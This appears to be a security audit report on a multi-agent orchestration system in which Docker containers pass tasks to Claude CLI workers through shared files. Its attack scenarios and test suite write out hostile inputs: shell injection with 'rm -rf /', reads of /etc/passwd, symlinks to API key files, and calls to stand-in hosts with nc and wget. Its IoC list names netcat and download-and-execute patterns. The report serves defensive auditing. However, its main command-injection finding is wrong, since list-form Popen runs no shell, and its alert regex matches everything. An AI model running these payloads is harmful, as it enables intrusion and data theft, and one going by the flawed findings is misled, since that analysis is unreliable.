# Security Audit Report: Hooks-Based Agent Communication System

**Date**: November 19, 2024
**Auditor**: Security Specialist
**System**: Multi-Agent Orchestration with File-Based IPC
**Classification**: **HIGH RISK** - Multiple Critical Vulnerabilities Found

---

## Executive Summary

The audit reveals **critical security vulnerabilities** in the multi-agent orchestration system that could lead to:
- **Remote Code Execution (RCE)** through command injection
- **Privilege escalation** via insecure file permissions
- **Container escape** through volume mount misconfigurations
- **Data exfiltration** through unvalidated file operations
- **Denial of Service** through resource exhaustion

**Risk Level**: 🔴 **CRITICAL** - Immediate remediation required before production deployment.

---

## 1. Threat Model

### 1.1 Attack Surface Map

```
┌─────────────────────────────────────────────────────────────┐
│                     EXTERNAL ATTACK VECTORS                  │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  [User Input] ──────> [Task JSON Files] ──────> [Workers]  │
│       ↓                      ↓                       ↓       │
│  [Orchestrator] ────> [Shared Volumes] ────> [Claude CLI]  │
│       ↓                      ↓                       ↓       │
│  [Docker API] ──────> [Named Pipes] ───────> [Shell Exec]  │
│       ↓                      ↓                       ↓       │
│  [Signals] ─────────> [File System] ───────> [Python Proc] │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 Trust Boundaries

| Boundary | Description | Current State | Risk |
|----------|-------------|--------------|------|
| User → Orchestrator | Task submission | **NO VALIDATION** | CRITICAL |
| Orchestrator → Workers | Task dispatch | **NO AUTHENTICATION** | CRITICAL |
| Workers → Results | Output writing | **NO INTEGRITY CHECK** | HIGH |
| Container → Host | Volume mounts | **ROOT OWNERSHIP** | CRITICAL |
| Process → Process | Signal handling | **NO VERIFICATION** | MEDIUM |

### 1.3 Attack Scenarios

#### Scenario 1: Command Injection via Task Description
```json
{
  "task_id": "evil",
  "description": "'; rm -rf /; echo 'pwned"
}
```
**Impact**: Complete system compromise

#### Scenario 2: Path Traversal via Task ID
```json
{
  "task_id": "../../../etc/passwd",
  "description": "read sensitive files"
}
```
**Impact**: Sensitive data exposure

#### Scenario 3: Container Escape via Volume Mount
```bash
# Worker has write access to host filesystem
docker exec marie ln -sf /host/etc/shadow /results/shadow
```
**Impact**: Host system compromise

---

## 2. Critical Vulnerabilities Found

### 2.1 🔴 CRITICAL: Command Injection in Task Processing

**Location**: `/tools/activation_wrapper.py:206-208`
```python
self.claude_process = subprocess.Popen(
    ["claude", "-p", description],  # ← VULNERABLE: description is unvalidated
    stdout=subprocess.PIPE,
```

**Exploit**:
```json
{
  "task_id": "cmd-injection",
  "description": "test'; cat /etc/passwd > /results/leaked.txt; echo 'done"
}
```

**Impact**: Remote Code Execution with container privileges

### 2.2 🔴 CRITICAL: Insecure File Permissions

**Finding**: Task directories owned by root with 755 permissions
```bash
$ stat -c "%a %U:%G" /core/shared/tasks/marie
755 root:root
```

**Impact**:
- Any process can read task files (information disclosure)
- Root ownership allows privilege escalation

### 2.3 🔴 CRITICAL: No Input Validation on JSON Parsing

**Location**: `/tools/activation_wrapper.py:173`
```python
task_data = json.loads(task_path.read_text())  # ← No size limit
task_id = task_data.get('task_id', task_path.stem)  # ← No sanitization
```

**Exploits**:
1. **JSON Bomb**: 1GB malformed JSON causes OOM
2. **Path Injection**: `task_id: "../../../etc/passwd"`
3. **Unicode Attacks**: Homograph characters in filenames

### 2.4 🔴 HIGH: TOCTOU Race Condition

**Location**: `/tools/activation_wrapper.py:169-173`
```python
if not task_path.exists():  # ← Check
    return
task_data = json.loads(task_path.read_text())  # ← Use (time gap!)
```

**Attack**: Replace file between check and use
```bash
while true; do
  echo '{"evil": true}' > /tasks/marie/legit.json
  ln -sf /etc/passwd /tasks/marie/legit.json
done
```

### 2.5 🔴 HIGH: Arbitrary Signal Injection

**Location**: `/send-task-to-marie.sh:48`
```bash
docker exec marie pkill -USR1 -f claude
```

**Attack**: Any container user can send signals
```bash
# DoS attack - kill all Claude processes
docker exec attacker pkill -9 -f claude
```

### 2.6 🟡 MEDIUM: Symlink Following

**Finding**: No symlink protection in file operations
```python
Path(task_path).read_text()  # Follows symlinks!
```

**Attack**: Link task files to sensitive locations
```bash
ln -s /home/agent/.claude/api_keys.json /tasks/marie/steal.json
```

### 2.7 🟡 MEDIUM: Information Leakage via Logs

**Location**: Docker logs contain sensitive data
```python
stdout, stderr = self.claude_process.communicate()
result = {"stdout": stdout, "stderr": stderr}  # Full output logged!
```

**Impact**: API keys, passwords in logs

### 2.8 🟡 LOW: Missing Resource Limits

**Finding**: No limits on:
- Task queue size (memory exhaustion)
- File sizes (disk exhaustion)
- Process count (fork bomb)
- CPU/Memory per container

---

## 3. Hardening Recommendations

### 3.1 Immediate Actions (Block Production)

#### Input Validation Framework
```python
import re
import html
from pathlib import Path

class TaskValidator:
    MAX_DESCRIPTION_LENGTH = 10000
    MAX_TASK_ID_LENGTH = 100
    SAFE_TASK_ID_PATTERN = re.compile(r'^[a-zA-Z0-9_-]+$')

    @classmethod
    def validate_task(cls, task_data: dict) -> dict:
        # Validate task_id
        task_id = str(task_data.get('task_id', ''))
        if not cls.SAFE_TASK_ID_PATTERN.match(task_id):
            raise ValueError(f"Invalid task_id: {task_id}")
        if len(task_id) > cls.MAX_TASK_ID_LENGTH:
            raise ValueError("Task ID too long")

        # Sanitize description - escape shell metacharacters
        description = task_data.get('description', '')
        if len(description) > cls.MAX_DESCRIPTION_LENGTH:
            raise ValueError("Description too long")

        # HTML escape and shell escape
        safe_description = html.escape(description)
        safe_description = shlex.quote(safe_description)

        return {
            'task_id': task_id,
            'description': safe_description,
            'timestamp': datetime.utcnow().isoformat()
        }
```

#### Secure Command Execution
```python
# NEVER pass user input directly to shell
def execute_task_secure(task_description: str):
    # Use stdin instead of command line arguments
    process = subprocess.Popen(
        ["claude", "--no-interactive"],  # Fixed command
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        env={
            **os.environ,
            'CLAUDE_TASK': 'sanitized',  # Pass via env
        }
    )

    # Send description via stdin (not command line!)
    stdout, stderr = process.communicate(
        input=task_description,
        timeout=600
    )
```

### 3.2 File System Security Matrix

| Path | Owner | Permissions | Mount Options | Rationale |
|------|-------|-------------|---------------|-----------|
| `/tasks/{worker}/` | `1000:1000` | `750` | `ro,nosuid,nodev,noexec` | Read-only for workers |
| `/results/{worker}/` | `1000:1000` | `750` | `rw,nosuid,nodev,noexec` | Write for results only |
| `/shared/heartbeats/` | `1000:1000` | `755` | `rw,nosuid,nodev,noexec` | Health monitoring |
| `/home/agent/` | `1000:1000` | `700` | `rw,nosuid,nodev` | User home isolation |

### 3.3 Docker Security Configuration

```yaml
services:
  marie:
    image: docker/sandbox-templates:claude-code
    container_name: marie
    security_opt:
      - no-new-privileges:true
      - apparmor=docker-default
      - seccomp=default.json
    cap_drop:
      - ALL
    cap_add:
      - DAC_OVERRIDE  # Only if needed for file ops
    read_only: true  # Read-only root filesystem
    tmpfs:
      - /tmp:rw,nosuid,nodev,noexec,size=100m
      - /var/tmp:rw,nosuid,nodev,noexec,size=100m
    user: "1000:1000"  # Non-root user
    volumes:
      - ./tasks/marie:/tasks:ro  # READ ONLY
      - ./results/marie:/results:rw,nosuid,nodev,noexec
      - type: tmpfs
        target: /tmp
        tmpfs:
          size: 104857600  # 100MB limit
    deploy:
      resources:
        limits:
          cpus: '2.0'
          memory: 2G
        reservations:
          cpus: '0.5'
          memory: 512M
    healthcheck:
      test: ["CMD", "pgrep", "-f", "claude"]
      interval: 30s
      timeout: 10s
      retries: 3
```

### 3.4 AppArmor Profile

```
#include <tunables/global>

profile docker-claude flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Deny network access
  deny network,

  # Deny capability escalation
  deny capability setuid,
  deny capability setgid,
  deny capability dac_override,
  deny capability sys_admin,

  # Read-only access to task directory
  /tasks/{,**} r,

  # Write access to results only
  /results/{,**} rw,

  # Deny access to sensitive files
  deny /etc/shadow r,
  deny /etc/passwd w,
  deny /proc/*/mem rw,

  # Allow Python execution
  /usr/bin/python3* ix,
  /usr/bin/claude ix,

  # Temp files
  /tmp/{,**} rw,
}
```

### 3.5 Seccomp Filter

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "open", "close", "stat", "fstat",
        "mmap", "mprotect", "munmap", "brk", "rt_sigaction",
        "rt_sigprocmask", "ioctl", "pread64", "pwrite64",
        "access", "pipe", "select", "sched_yield", "dup",
        "dup2", "pause", "nanosleep", "getpid", "sendfile",
        "socket", "connect", "accept", "sendto", "recvfrom",
        "recvmsg", "shutdown", "bind", "listen", "getsockname",
        "getpeername", "socketpair", "setsockopt", "getsockopt",
        "clone", "fork", "vfork", "execve", "exit", "wait4",
        "kill", "fcntl", "getdents", "getcwd", "chdir",
        "rename", "mkdir", "rmdir", "link", "unlink",
        "readlink", "chmod", "chown", "umask", "gettimeofday"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": ["ptrace"],
      "action": "SCMP_ACT_ERRNO"
    },
    {
      "names": ["personality"],
      "action": "SCMP_ACT_ERRNO"
    },
    {
      "names": ["mount", "umount2"],
      "action": "SCMP_ACT_ERRNO"
    }
  ]
}
```

### 3.6 Authentication & Message Integrity

```python
import hmac
import hashlib
import json
from datetime import datetime, timedelta

class SecureTaskQueue:
    def __init__(self, shared_secret: str):
        self.secret = shared_secret.encode()

    def sign_task(self, task_data: dict) -> dict:
        """Add HMAC signature to task"""
        task_data['timestamp'] = datetime.utcnow().isoformat()
        task_data['expires'] = (
            datetime.utcnow() + timedelta(minutes=10)
        ).isoformat()

        # Create signature
        message = json.dumps(task_data, sort_keys=True)
        signature = hmac.new(
            self.secret,
            message.encode(),
            hashlib.sha256
        ).hexdigest()

        return {
            'data': task_data,
            'signature': signature
        }

    def verify_task(self, signed_task: dict) -> dict:
        """Verify task signature and expiry"""
        data = signed_task.get('data', {})
        signature = signed_task.get('signature', '')

        # Check expiry
        expires = datetime.fromisoformat(data.get('expires', ''))
        if datetime.utcnow() > expires:
            raise ValueError("Task expired")

        # Verify signature
        message = json.dumps(data, sort_keys=True)
        expected_sig = hmac.new(
            self.secret,
            message.encode(),
            hashlib.sha256
        ).hexdigest()

        if not hmac.compare_digest(signature, expected_sig):
            raise ValueError("Invalid task signature")

        return data
```

---

## 4. Monitoring & Detection

### 4.1 Security Logging Requirements

```python
import logging
from typing import Any
import json

class SecurityAuditLogger:
    def __init__(self):
        self.logger = logging.getLogger('security')
        handler = logging.handlers.RotatingFileHandler(
            '/var/log/agent-security.log',
            maxBytes=10485760,  # 10MB
            backupCount=10
        )
        handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        ))
        self.logger.addHandler(handler)

    def log_task_received(self, task_id: str, source: str):
        self.logger.info(json.dumps({
            'event': 'task_received',
            'task_id': task_id,
            'source': source,
            'timestamp': datetime.utcnow().isoformat()
        }))

    def log_validation_failure(self, task_id: str, reason: str):
        self.logger.warning(json.dumps({
            'event': 'validation_failed',
            'task_id': task_id,
            'reason': reason,
            'timestamp': datetime.utcnow().isoformat()
        }))

    def log_suspicious_activity(self, details: dict):
        self.logger.error(json.dumps({
            'event': 'suspicious_activity',
            'details': details,
            'timestamp': datetime.utcnow().isoformat()
        }))
```

### 4.2 Anomaly Detection Rules

| Rule | Threshold | Action |
|------|-----------|--------|
| Task queue > 100 | 100 tasks | Alert + Throttle |
| Task size > 1MB | 1048576 bytes | Reject + Alert |
| Failed validations > 10/min | 10 per minute | Block source |
| CPU usage > 80% | 80% sustained | Kill process |
| Memory > 2GB | 2147483648 bytes | OOM kill |
| Disk writes > 100MB/s | 104857600 bytes/s | Throttle I/O |

### 4.3 Alerting Configuration

```yaml
alerts:
  - name: "Command Injection Attempt"
    pattern: ".*;.*|.*&&.*|.*||.*"
    severity: CRITICAL
    action:
      - block_task
      - alert_security_team
      - preserve_evidence

  - name: "Path Traversal Attempt"
    pattern: ".*\\.\\..*|.*/etc/.*|.*/proc/.*"
    severity: HIGH
    action:
      - block_task
      - log_incident

  - name: "Resource Exhaustion"
    condition: "queue_size > 100 OR memory > 2GB"
    severity: MEDIUM
    action:
      - throttle_source
      - alert_ops
```

---

## 5. Compliance Considerations

### 5.1 OWASP Top 10 Mapping

| OWASP Category | Finding | Status | Remediation |
|----------------|---------|--------|-------------|
| A03:2021 - Injection | Command injection via task description | 🔴 FAIL | Input validation + parameterized execution |
| A01:2021 - Broken Access Control | Root-owned directories, no auth | 🔴 FAIL | Implement RBAC + fix permissions |
| A02:2021 - Cryptographic Failures | No message integrity | 🔴 FAIL | HMAC signatures on tasks |
| A04:2021 - Insecure Design | No threat model | 🔴 FAIL | Security by design refactor |
| A05:2021 - Security Misconfiguration | Permissive Docker config | 🔴 FAIL | Harden containers |
| A06:2021 - Vulnerable Components | Unknown dependency risks | 🟡 WARN | Dependency scanning |
| A07:2021 - Auth Failures | No worker authentication | 🔴 FAIL | Implement mTLS |
| A08:2021 - Integrity Failures | No code signing | 🟡 WARN | Sign container images |
| A09:2021 - Logging Failures | Insufficient security logs | 🟡 WARN | Comprehensive audit logging |
| A10:2021 - SSRF | Not applicable | ✅ N/A | - |

### 5.2 CIS Docker Benchmark

| Control | Description | Status | Action Required |
|---------|-------------|--------|-----------------|
| 2.1 | Run as non-root user | 🔴 FAIL | Set user: 1000:1000 |
| 2.2 | Use trusted base images | 🟡 UNKNOWN | Verify image signatures |
| 2.5 | Use read-only root filesystem | 🔴 FAIL | Add read_only: true |
| 2.8 | Remove setuid/setgid binaries | 🔴 FAIL | Mount with nosuid |
| 2.14 | Add health checks | ✅ PASS | - |
| 2.15 | Limit memory usage | 🔴 FAIL | Add memory limits |
| 2.18 | Use secrets management | 🔴 FAIL | Use Docker secrets |
| 5.1 | Enable AppArmor | 🔴 FAIL | Create AppArmor profiles |
| 5.2 | Enable SELinux | 🔴 FAIL | Configure SELinux labels |
| 5.3 | Restrict capabilities | 🔴 FAIL | Drop ALL, add specific |

---

## 6. Incident Response Runbook

### 6.1 Suspected Compromise

```bash
#!/bin/bash
# Emergency response script

# 1. Isolate affected containers
docker network disconnect claude-network marie
docker network disconnect claude-network anga
docker network disconnect claude-network fabien

# 2. Preserve evidence
docker logs marie > /evidence/marie-$(date +%s).log
docker logs anga > /evidence/anga-$(date +%s).log
docker logs fabien > /evidence/fabien-$(date +%s).log

# 3. Snapshot file systems
tar -czf /evidence/tasks-$(date +%s).tar.gz /core/shared/tasks/
tar -czf /evidence/results-$(date +%s).tar.gz /core/shared/results/

# 4. Kill compromised containers
docker kill marie anga fabien

# 5. Rotate secrets
# ... rotate all API keys and secrets ...

# 6. Rebuild from clean images
docker-compose down
docker system prune -af
docker-compose up -d
```

### 6.2 Indicators of Compromise (IoCs)

```yaml
iocs:
  files:
    - /tmp/.*\\.sh$  # Suspicious shell scripts
    - /results/.*/\\..*  # Hidden files in results
    - .*\\.\\..*  # Path traversal attempts

  processes:
    - "nc -l"  # Netcat listeners
    - "wget|curl.*\\|.*sh"  # Download and execute
    - "/bin/sh -i"  # Interactive shells

  network:
    - connections to external IPs
    - unexpected DNS queries
    - large data transfers

  logs:
    - "permission denied" > 10/min
    - "command not found" patterns
    - base64 encoded commands
```

---

## 7. Testing & Validation

### 7.1 Security Test Suite

```python
import pytest
import json
from pathlib import Path

class TestSecurityControls:

    def test_command_injection_blocked(self):
        """Verify command injection is prevented"""
        malicious_tasks = [
            "'; cat /etc/passwd; echo '",
            "$(cat /etc/shadow)",
            "`rm -rf /`",
            "| nc attacker.com 4444",
            "&& wget evil.sh && sh evil.sh"
        ]

        for payload in malicious_tasks:
            task = {"task_id": "test", "description": payload}
            with pytest.raises(ValidationError):
                validate_task(task)

    def test_path_traversal_blocked(self):
        """Verify path traversal is prevented"""
        evil_ids = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]

        for task_id in evil_ids:
            task = {"task_id": task_id, "description": "test"}
            with pytest.raises(ValidationError):
                validate_task(task)

    def test_resource_limits_enforced(self):
        """Verify resource limits work"""
        # Test memory limit
        large_task = {
            "task_id": "mem_test",
            "description": "x" * (10 * 1024 * 1024)  # 10MB
        }
        with pytest.raises(ValidationError, match="too long"):
            validate_task(large_task)

        # Test queue limit
        for i in range(101):
            assert queue.size() <= 100

    def test_signature_verification(self):
        """Verify HMAC signatures are checked"""
        task = {"task_id": "test", "description": "valid"}
        signed = sign_task(task)

        # Tamper with data
        signed['data']['description'] = "tampered"

        with pytest.raises(ValueError, match="Invalid signature"):
            verify_task(signed)
```

### 7.2 Penetration Test Checklist

- [ ] Command injection via task descriptions
- [ ] Path traversal via task IDs
- [ ] Symlink attacks on task files
- [ ] Race conditions in file operations
- [ ] Signal injection attacks
- [ ] Resource exhaustion (CPU, memory, disk)
- [ ] Container escape attempts
- [ ] Privilege escalation via setuid
- [ ] Network breakout from containers
- [ ] Secret extraction from memory/logs

---

## 8. Recommendations Priority

### 🔴 P0 - CRITICAL (Block Production)
1. **Fix command injection** - Sanitize all inputs
2. **Fix file permissions** - Non-root ownership
3. **Add input validation** - Strict schema validation
4. **Enable authentication** - HMAC signatures minimum

### 🟡 P1 - HIGH (Fix within 1 week)
1. **Harden Docker** - Security options, capabilities
2. **Add resource limits** - CPU, memory, disk quotas
3. **Implement logging** - Security audit trail
4. **Fix TOCTOU races** - Atomic file operations

### 🟢 P2 - MEDIUM (Fix within 1 month)
1. **Add monitoring** - Anomaly detection
2. **Create AppArmor profiles** - Syscall filtering
3. **Implement secrets management** - Vault/Docker secrets
4. **Add health checks** - Liveness/readiness probes

---

## Conclusion

The current system has **multiple critical security vulnerabilities** that make it unsuitable for production deployment. The most severe issues are:

1. **Command injection** allowing arbitrary code execution
2. **No authentication** between components
3. **Insecure file permissions** enabling privilege escalation
4. **No input validation** on user-supplied data

These vulnerabilities could lead to complete system compromise, data breach, and service disruption.

### Required Actions Before Production

1. ✅ Implement comprehensive input validation
2. ✅ Add authentication and message integrity
3. ✅ Fix file permissions (non-root, restricted)
4. ✅ Harden container configurations
5. ✅ Add security monitoring and alerting
6. ✅ Conduct penetration testing
7. ✅ Obtain security sign-off

**Current Security Posture**: 2/10 🔴
**Target Security Posture**: 8/10 ✅

---

## Appendix A: Secure Implementation Example

```python
#!/usr/bin/env python3
"""
Secure Agent Activation Wrapper
Implements defense-in-depth security controls
"""

import os
import json
import shlex
import hmac
import hashlib
import subprocess
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, Optional
import re

class SecureTaskProcessor:
    # Security constants
    MAX_TASK_SIZE = 1024 * 100  # 100KB
    MAX_TASK_ID_LENGTH = 64
    MAX_DESCRIPTION_LENGTH = 10000
    TASK_ID_PATTERN = re.compile(r'^[a-zA-Z0-9_-]+$')
    TASK_TIMEOUT = 600  # 10 minutes

    def __init__(self, worker_name: str, shared_secret: str):
        self.worker_name = worker_name
        self.secret = shared_secret.encode()
        self.task_dir = Path(f"/tasks/{worker_name}")
        self.result_dir = Path(f"/results/{worker_name}")

        # Ensure directories exist with correct permissions
        self.task_dir.mkdir(mode=0o750, parents=True, exist_ok=True)
        self.result_dir.mkdir(mode=0o750, parents=True, exist_ok=True)

    def validate_task_file(self, task_path: Path) -> bool:
        """Validate task file before processing"""
        # Check file size
        if task_path.stat().st_size > self.MAX_TASK_SIZE:
            raise ValueError(f"Task file too large: {task_path}")

        # Ensure it's a regular file (not symlink)
        if not task_path.is_file() or task_path.is_symlink():
            raise ValueError(f"Invalid task file type: {task_path}")

        # Check it's in the correct directory
        try:
            task_path.resolve().relative_to(self.task_dir.resolve())
        except ValueError:
            raise ValueError(f"Task file outside task directory: {task_path}")

        return True

    def validate_task_data(self, task_data: Dict) -> Dict:
        """Validate and sanitize task data"""
        # Validate task_id
        task_id = str(task_data.get('task_id', ''))
        if not self.TASK_ID_PATTERN.match(task_id):
            raise ValueError(f"Invalid task_id format: {task_id}")
        if len(task_id) > self.MAX_TASK_ID_LENGTH:
            raise ValueError(f"Task ID too long: {len(task_id)}")

        # Validate description
        description = str(task_data.get('description', ''))
        if len(description) > self.MAX_DESCRIPTION_LENGTH:
            raise ValueError(f"Description too long: {len(description)}")

        # Sanitize description for shell safety
        safe_description = shlex.quote(description)

        # Verify signature if present
        if 'signature' in task_data:
            self.verify_signature(task_data)

        return {
            'task_id': task_id,
            'description': safe_description,
            'timestamp': datetime.utcnow().isoformat(),
            'worker': self.worker_name
        }

    def verify_signature(self, signed_task: Dict) -> Dict:
        """Verify HMAC signature on task"""
        data = signed_task.get('data', {})
        signature = signed_task.get('signature', '')

        # Check expiry
        expires = datetime.fromisoformat(data.get('expires', ''))
        if datetime.utcnow() > expires:
            raise ValueError("Task has expired")

        # Compute expected signature
        message = json.dumps(data, sort_keys=True)
        expected = hmac.new(
            self.secret,
            message.encode(),
            hashlib.sha256
        ).hexdigest()

        # Constant-time comparison
        if not hmac.compare_digest(signature, expected):
            raise ValueError("Invalid task signature")

        return data

    def execute_task_secure(self, task_data: Dict) -> Dict:
        """Execute task with security controls"""
        task_id = task_data['task_id']
        description = task_data['description']

        # Create sandbox environment
        env = {
            'HOME': '/tmp',
            'PATH': '/usr/local/bin:/usr/bin:/bin',
            'TASK_ID': task_id,
            'WORKER': self.worker_name
        }

        # Execute with restrictions
        try:
            process = subprocess.Popen(
                ['claude', '--non-interactive'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=env,
                cwd='/tmp',
                start_new_session=True,  # New process group
                preexec_fn=self._drop_privileges
            )

            # Send task via stdin (not command line!)
            stdout, stderr = process.communicate(
                input=description.encode(),
                timeout=self.TASK_TIMEOUT
            )

            return {
                'task_id': task_id,
                'status': 'completed' if process.returncode == 0 else 'failed',
                'exit_code': process.returncode,
                'stdout': stdout.decode('utf-8', errors='replace')[:10000],
                'stderr': stderr.decode('utf-8', errors='replace')[:10000],
                'timestamp': datetime.utcnow().isoformat()
            }

        except subprocess.TimeoutExpired:
            process.kill()
            return {
                'task_id': task_id,
                'status': 'timeout',
                'error': f'Task exceeded {self.TASK_TIMEOUT}s timeout'
            }
        except Exception as e:
            return {
                'task_id': task_id,
                'status': 'error',
                'error': str(e)
            }

    def _drop_privileges(self):
        """Drop privileges before executing user code"""
        if os.getuid() == 0:
            # Drop to nobody user
            os.setgroups([])
            os.setgid(65534)  # nobody
            os.setuid(65534)  # nobody

    def process_task(self, task_path: Path) -> None:
        """Main task processing with all security checks"""
        try:
            # Validate file
            self.validate_task_file(task_path)

            # Read and parse
            with open(task_path, 'r') as f:
                raw_data = f.read(self.MAX_TASK_SIZE)
                task_data = json.loads(raw_data)

            # Validate data
            validated_task = self.validate_task_data(task_data)

            # Execute securely
            result = self.execute_task_secure(validated_task)

            # Write result atomically
            result_file = self.result_dir / f"{validated_task['task_id']}.json"
            temp_file = result_file.with_suffix('.tmp')

            with open(temp_file, 'w') as f:
                json.dump(result, f, indent=2)

            temp_file.replace(result_file)

            # Clean up task file
            task_path.unlink()

        except Exception as e:
            print(f"Security error processing task: {e}")
            # Log security event
            self.log_security_event({
                'event': 'task_processing_error',
                'task_path': str(task_path),
                'error': str(e),
                'timestamp': datetime.utcnow().isoformat()
            })

    def log_security_event(self, event: Dict):
        """Log security-relevant events"""
        with open('/var/log/agent-security.log', 'a') as f:
            f.write(json.dumps(event) + '\n')


if __name__ == "__main__":
    # Initialize with security
    import sys

    if len(sys.argv) < 2:
        print("Usage: secure_wrapper.py <worker_name>")
        sys.exit(1)

    worker_name = sys.argv[1]
    shared_secret = os.environ.get('AGENT_SECRET', 'change-me')

    processor = SecureTaskProcessor(worker_name, shared_secret)

    # Main processing loop with security controls
    # ... (inotify/polling logic here) ...
```

---

**End of Security Audit Report**

**Classification**: HIGH RISK - DO NOT DEPLOY TO PRODUCTION
**Next Steps**: Implement P0 critical fixes immediately
**Review Date**: Schedule follow-up audit after remediation